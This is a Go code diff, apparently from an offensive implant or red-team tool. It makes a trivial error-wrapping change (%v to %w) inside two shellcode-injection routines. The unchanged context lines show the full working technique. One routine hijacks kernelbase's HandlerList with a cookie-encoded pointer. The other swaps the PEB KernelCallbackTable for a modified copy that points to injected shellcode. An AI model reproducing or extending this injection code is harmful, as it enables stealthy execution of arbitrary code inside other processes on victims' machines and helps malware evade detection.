@@ -37,7 +37,7 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	// Step 2: Find kernelbase.dll in target process
 	kernelbaseAddr, err := findModuleInProcess(windows.Handle(hProcess), "kernelbase.dll")
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to find kernelbase.dll: %v", err)
+		return sb.String(), fmt.Errorf("failed to find kernelbase.dll: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Found kernelbase.dll at: 0x%X\n", kernelbaseAddr))
 
@@ -50,18 +50,18 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	var handlerArrayAddr uintptr
 	err = injectReadMemoryInto(hProcess, handlerListPtrAddr, unsafe.Pointer(&handlerArrayAddr), 8)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to read HandlerList pointer: %v", err)
+		return sb.String(), fmt.Errorf("failed to read HandlerList pointer: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Handler array at: 0x%X\n", handlerArrayAddr))
 
 	var handlerCount, allocatedCount uint32
 	err = injectReadMemoryInto(hProcess, handlerListLengthAddr, unsafe.Pointer(&handlerCount), 4)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to read HandlerListLength: %v", err)
+		return sb.String(), fmt.Errorf("failed to read HandlerListLength: %w", err)
 	}
 	err = injectReadMemoryInto(hProcess, allocatedLengthAddr, unsafe.Pointer(&allocatedCount), 4)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to read AllocatedHandlerListLength: %v", err)
+		return sb.String(), fmt.Errorf("failed to read AllocatedHandlerListLength: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Current handlers: %d, Capacity: %d\n", handlerCount, allocatedCount))
 
@@ -72,14 +72,14 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	// Step 5: Get process cookie
 	pointerCookie, err := getProcessCookie(windows.Handle(hProcess))
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to get process cookie: %v", err)
+		return sb.String(), fmt.Errorf("failed to get process cookie: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Process cookie: 0x%X\n", pointerCookie))
 
 	// Step 6: Allocate + write shellcode (W^X: RW → write → RX)
 	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
 	if err != nil {
-		return sb.String(), fmt.Errorf("shellcode injection failed: %v", err)
+		return sb.String(), fmt.Errorf("shellcode injection failed: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr))
 
@@ -92,7 +92,7 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	encodedBytes := (*[8]byte)(unsafe.Pointer(&encodedShellcodeAddr))[:]
 	_, err = injectWriteMemory(hProcess, targetSlot, encodedBytes)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to write handler to array: %v", err)
+		return sb.String(), fmt.Errorf("failed to write handler to array: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote encoded handler to slot %d\n", handlerCount))
 
@@ -101,7 +101,7 @@ func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
 	newCountBytes := (*[4]byte)(unsafe.Pointer(&newCount))[:]
 	_, err = injectWriteMemory(hProcess, handlerListLengthAddr, newCountBytes)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to update HandlerListLength: %v", err)
+		return sb.String(), fmt.Errorf("failed to update HandlerListLength: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Updated HandlerListLength: %d -> %d\n", handlerCount, newCount))
 
@@ -179,7 +179,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	var kernelCallbackTable uintptr
 	err = injectReadMemoryInto(hProcess, kernelCallbackTablePtrAddr, unsafe.Pointer(&kernelCallbackTable), 8)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to read KernelCallbackTable pointer: %v", err)
+		return sb.String(), fmt.Errorf("failed to read KernelCallbackTable pointer: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Original KernelCallbackTable: 0x%X\n", kernelCallbackTable))
 
@@ -191,7 +191,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	const tableSize = 256 * 8
 	originalTable, err := injectReadMemory(hProcess, kernelCallbackTable, tableSize)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to read KernelCallbackTable: %v", err)
+		return sb.String(), fmt.Errorf("failed to read KernelCallbackTable: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Read original callback table (%d bytes)\n", len(originalTable)))
 
@@ -201,7 +201,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	// Step 5: Allocate + write shellcode (W^X: RW → write → RX)
 	shellcodeAddr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
 	if err != nil {
-		return sb.String(), fmt.Errorf("shellcode injection failed: %v", err)
+		return sb.String(), fmt.Errorf("shellcode injection failed: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", shellcodeAddr))
 
@@ -214,11 +214,11 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	// Step 7: Allocate + write modified table (RW is fine, no execution needed)
 	remoteTableAddr, err := injectAllocMemory(hProcess, tableSize, PAGE_READWRITE)
 	if err != nil {
-		return sb.String(), fmt.Errorf("remote allocation for table failed: %v", err)
+		return sb.String(), fmt.Errorf("remote allocation for table failed: %w", err)
 	}
 	_, err = injectWriteMemory(hProcess, remoteTableAddr, modifiedTable)
 	if err != nil {
-		return sb.String(), fmt.Errorf("remote write for table failed: %v", err)
+		return sb.String(), fmt.Errorf("remote write for table failed: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Modified callback table at: 0x%X\n", remoteTableAddr))
 
@@ -226,7 +226,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 	ptrBytes := (*[8]byte)(unsafe.Pointer(&remoteTableAddr))[:]
 	_, err = injectWriteMemory(hProcess, kernelCallbackTablePtrAddr, ptrBytes)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to update PEB KernelCallbackTable pointer: %v", err)
+		return sb.String(), fmt.Errorf("failed to update PEB KernelCallbackTable pointer: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Updated PEB+0x58: 0x%X -> 0x%X\n", kernelCallbackTable, remoteTableAddr))
 
@@ -236,7 +236,7 @@ func executeOpusVariant4(shellcode []byte, pid uint32) (string, error) {
 		// Restore original table pointer before failing
 		origPtrBytes := (*[8]byte)(unsafe.Pointer(&kernelCallbackTable))[:]
 		injectWriteMemory(hProcess, kernelCallbackTablePtrAddr, origPtrBytes)
-		return sb.String(), fmt.Errorf("failed to find window for PID %d: %v", pid, err)
+		return sb.String(), fmt.Errorf("failed to find window for PID %d: %w", pid, err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Found target window: 0x%X\n", hwnd))
 
